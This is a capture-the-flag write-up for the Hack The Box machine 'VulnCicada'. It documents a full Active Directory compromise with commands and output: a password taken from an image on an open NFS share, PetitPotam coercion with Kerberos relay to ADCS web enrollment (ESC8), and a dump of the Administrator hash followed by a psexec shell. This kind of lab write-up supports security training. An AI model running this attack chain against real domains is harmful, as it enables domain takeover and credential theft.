---
title: "HTB - VulnCicada"
date: 2026-07-15
---

## Overview

VulnCicada is a medium-rated Windows Active Directory machine. Kerberos is used exclusively for authentication, as NTLM is disabled domain-wide. First, I'll find a password inside an image on a public NFS share. With a set of credentials, I'll find the machine is vulnerable to ESC8, exploitable here via a Kerberos-based relay variant rather than the classic NTLM relay. Finally, I'll dump hashes and compromise the domain administrator, owning the domain.

## Recon
#### Nmap
```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 -Pn 10.129.234.48
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 23:47 +0100
Nmap scan report for 10.129.234.48
Host is up (0.023s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
50379/tcp open  unknown
50845/tcp open  unknown
51109/tcp open  unknown
60134/tcp open  unknown
60136/tcp open  unknown
60153/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 107.33 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p53,80,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389 -sCV 10.129.234.48
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-14 23:52 +0100
Nmap scan report for 10.129.234.48
Host is up (0.017s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-14 22:53:02Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-14T18:32:12
|_Not valid after:  2027-07-14T18:32:12
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-14T18:32:12
|_Not valid after:  2027-07-14T18:32:12
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-14T18:32:12
|_Not valid after:  2027-07-14T18:32:12
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-07-14T18:32:12
|_Not valid after:  2027-07-14T18:32:12
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-07-13T18:39:50
|_Not valid after:  2027-01-12T18:39:50
|_ssl-date: 2026-07-14T22:54:23+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-14T22:53:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.49 seconds
```

Key findings:

- Port structure represents a Domain Controller (53,88,389,445).
- IIS - Microsoft IIS httpd 10.0.
- NFS/SMB/LDAP open for enumeration.
- FQDN of host fingerprinted via LDAP (`DC-JPQ225.cicada.vl`).

## Web - 80/tcp
I'll start by adding the FQDN (`DC-JPQ225.cicada.vl`) and domain (`cicada.vl`) to my `/etc/hosts` file.

```sh
┌──(kali㉿kali)-[~]
└─$ echo '10.129.234.48 DC-JPQ225.cicada.vl cicada.vl' | sudo tee -a /etc/hosts     
10.129.234.48 DC-JPQ225.cicada.vl cicada.vl
```

![IIS](/assets/img/vulncicada/IIS1.png)

Since DNS is open, I'll perform targeted DNS enumeration, which only reveals the global catalog subdomain. I'll attempt subdomain fuzzing, but again find nothing. For directory fuzzing, I only find the iisstart.htm landing page.

## NFS - 2049/tcp
Here, I'll find a list of folders on a NFS share named `profiles`.

```sh
┌──(kali㉿kali)-[~]
└─$ showmount -e cicada.vl
Export list for cicada.vl:
/profiles (everyone)

┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs cicada.vl:/profiles /mnt

┌──(kali㉿kali)-[~]
└─$ ls -la /mnt                                
total 14
drwxrwxrwx+  2 nobody nogroup 4096 Jun  3  2025 .
drwxr-xr-x  19 root   root    4096 Jul 11 01:58 ..
drwxrwxrwx+  2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+  2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+  2 nobody nogroup   64 Sep 13  2024 Shirley.West
```

Using `tree`, I'll find two files. The first in `Administrator`'s folder `vacation.png`, does not provide anything interesting.

![Man](/assets/img/vulncicada/man.png)

I can try various tools like `strings`, `exiftool`, and `file` to look for any low-hanging fruit, however I find nothing.

Next, I'll check `marketing.png` in `Rosie.Powell`'s directory, however I'm not able to open it - to fix this, I'll simply give myself permissions using `sudo`.

```sh
┌──(kali㉿kali)-[~]
└─$ sudo chmod +rwx /mnt/Rosie.Powell/marketing.png

┌──(kali㉿kali)-[~]
└─$ ls -la /mnt/Rosie.Powell/marketing.png
-rwxr-xr-x+ 1 nobody nogroup 1832505 Sep 13  2024 /mnt/Rosie.Powell/marketing.png
```

![Password Note](/assets/img/vulncicada/pass.png)

I'll find credentials on a sticky note in the image. Testing the password against the user `Rosie.Powell` presents a new problem - NTLM is disabled.
```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb cicada.vl -u rosie.powell -p cicada123      
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\rosie.powell:cicada123 STATUS_NOT_SUPPORTED 
```

## Kerberos
I'll use `netexec` to generate a kerberos configuration file.

```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb DC-JPQ225.cicada.vl --generate-krb5-file cicada.vl                     
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [+] krb5 conf saved to: cicada.vl
SMB         10.129.234.48   445    DC-JPQ225        [+] Run the following command to use the conf file: export KRB5_CONFIG=cicada.vl

┌──(kali㉿kali)-[~]
└─$ export KRB5_CONFIG=cicada.vl
```

Then I use `kinit` and attempt to request a TGT from the KDC. This fails, so I try the same password, but with a capital `C`, and it works.
```sh
┌──(kali㉿kali)-[~]
└─$ kinit rosie.powell 
Password for rosie.powell@CICADA.VL: 
kinit: Password incorrect while getting initial credentials

┌──(kali㉿kali)-[~]
└─$ kinit rosie.powell
Password for rosie.powell@CICADA.VL: 

┌──(kali㉿kali)-[~]
└─$ klist             
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: rosie.powell@CICADA.VL

Valid starting     Expires            Service principal
15/07/26 00:48:16  15/07/26 10:48:16  krbtgt/CICADA.VL@CICADA.VL
        renew until 16/07/26 00:48:12
```

Validation of successful Kerberos authentication:
```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb DC-JPQ225.cicada.vl -u rosie.powell -p Cicada123 -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123
```

## SMB - tcp/445
SMB Share enumeration is a great place to start when gaining a new set of credentials. I'll find the share `CertEnroll`, which shifts my focus towards ADCS.

```shell
┌──(kali㉿kali)-[~/htb/CPTS/vulncicada]
└─$ nxc smb 10.129.5.60 -u rosie.powell -p 'Cicada123' -k --shares 
SMB         10.129.5.60     445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.5.60     445    DC-JPQ225        [+] cicada.vl\rosie.powell:Cicada123 
SMB         10.129.5.60     445    DC-JPQ225        [*] Enumerated shares
SMB         10.129.5.60     445    DC-JPQ225        Share           Permissions     Remark
SMB         10.129.5.60     445    DC-JPQ225        -----           -----------     ------
SMB         10.129.5.60     445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         10.129.5.60     445    DC-JPQ225        C$                              Default share
SMB         10.129.5.60     445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.5.60     445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         10.129.5.60     445    DC-JPQ225        NETLOGON        READ            Logon server share
SMB         10.129.5.60     445    DC-JPQ225        profiles$       READ,WRITE      
SMB         10.129.5.60     445    DC-JPQ225        SYSVOL          READ            Logon server share
```

## ADCS
First I'll enumerate vulnerable certificate templates, using `certipy`.

```shell
┌──(kali㉿kali)-[~]
└─$ certipy find -target DC-JPQ225.cicada.vl -u rosie.powell@cicada.vl -p 'Cicada123' -dc-ip 10.129.234.48 -vulnerable -stdout -k
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 67FDC71330AD7C9542CF01ECCB591E02
    Certificate Validity Start          : 2026-07-14 18:35:51+00:00
    Certificate Validity End            : 2526-07-14 18:45:51+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

Here, I find the Certificate Authority is vulnerable to ESC8.

## Privilege Escalation
### ESC8
I can abuse ESC8 by coercing the DC into authenticating over SMB to my relay listener, then relaying that authentication to the ADCS web enrollment endpoint over HTTP to request a certificate.

While researching ESC8, I came across Kerberos relaying (a technique I wasn't previously aware of). In basic terms, the main prerequisites are being able to add a DNS record, or be able to perform LLMNR poisoning.

[This](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) is a great resource if you'd like to read more on the attack.

When the coercion causes the Domain Controller to authenticate to the hostname specified in the DNS record, the request hits my `ntlmrelayx` listener at my `tun0` IP address, and I can relay the `AP-REQ` message to the CA's web enrollment endpoint to authenticate as the machine account.

First I'll need to add a magic DNS entry using `bloodyad`. 
```sh
┌──(kali㉿kali)-[~]
└─$ bloodyad -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.229 
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

Next, I'll setup my `ntlmrelayx` listener, and target the `KerberosAuthentication` template. I choose this default template because it produces a certificate usable for authentication, i.e. requesting a TGT.

> To avoid any confusion, `ntlmrelayx` supports relaying Kerberos AP-REQ messages.

```sh
┌──(kali㉿kali)-[~]
└─$ impacket-ntlmrelayx -t http://DC-JPQ225.cicada.vl/certsrv/ --adcs --template 'KerberosAuthentication' -smb2support
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

I'll then need to coerce the DC into authenticating to the crafted hostname specified in the magic DNS record, which resolves to my `tun0`'s IP address.
```sh
┌──(kali㉿kali)-[~]
└─$ nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

Back on my `ntlmrelayx` listener, I have successfully gained a certificate for the machine account of the Domain Controller.
```sh
<SNIP>
[*] Servers started, waiting for connections
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://DC-JPQ225.cicada.vl SUCCEED [1]
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP server returned error code 200, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://DC-JPQ225.cicada.vl SUCCEED [2]
[*] http:///@dc-jpq225.cicada.vl [1] -> Generating CSR...
[*] http:///@dc-jpq225.cicada.vl [1] -> CSR generated!
[*] http:///@dc-jpq225.cicada.vl [1] -> Getting certificate...
[*] http:///@dc-jpq225.cicada.vl [2] -> Skipping user  since attack was already performed
[*] http:///@dc-jpq225.cicada.vl [1] -> GOT CERTIFICATE! ID 88
[*] http:///@dc-jpq225.cicada.vl [1] -> Writing PKCS#12 certificate to ./DC-JPQ225.cicada.vl.pfx
[*] http:///@dc-jpq225.cicada.vl [1] -> Certificate successfully written to file
```

With the certificate retrieved, I'll utilise `certipy` to request a TGT. From there, I could dump NTLM hashes for all Domain Users, but for the purpose of this CTF I'll target the `administrator` hash.
```sh
┌──(kali㉿kali)-[~]
└─$ certipy auth -pfx DC-JPQ225.cicada.vl.pfx -dc-ip 10.129.234.48
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     SAN DNS Host Name: 'cicada.vl'
[*]     SAN DNS Host Name: 'CICADA'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Found multiple identities in certificate
[*] Please select an identity:
    [0] DNS Host Name: 'DC-JPQ225.cicada.vl' (DC-JPQ225$@cicada.vl)
    [1] DNS Host Name: 'cicada.vl' (cicada$@vl)
    [2] DNS Host Name: 'CICADA' (CICADA@unknown)
> 0
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

```shell
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=dc-jpq225.ccache
```

```sh
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -k -no-pass cicada.vl/dc-jpq225\$@dc-jpq225.cicada.vl -just-dc-user administrator            
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
[*] Cleaning up... 
```

I'll request a TGT as Administrator and claim all flags to complete the machine.
```sh
┌──(kali㉿kali)-[~]
└─$ impacket-getTGT cicada.vl/'administrator' -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.234.48
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache

┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=administrator.ccache
```

### User & Root flags
```shell
┌──(kali㉿kali)-[~]
└─$ impacket-psexec cicada.vl/administrator@DC-JPQ225.cicada.vl -k -hashes :85a0da53871a9d56b6cd05deda3a5e87  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is D614-4931

 Directory of C:\Users\Administrator\Desktop

04/10/2025  11:00 PM    <DIR>          .
09/13/2024  09:10 AM    <DIR>          ..
09/15/2024  06:26 AM             2,304 Microsoft Edge.lnk
07/14/2026  11:40 AM                34 root.txt
07/14/2026  11:40 AM                34 user.txt
               3 File(s)          2,372 bytes
               2 Dir(s)   3,429,883,904 bytes free

C:\Users\Administrator\Desktop> type user.txt
<REDACTED_FLAG>

C:\Users\Administrator\Desktop> type root.txt
<REDACTED_FLAG>
```
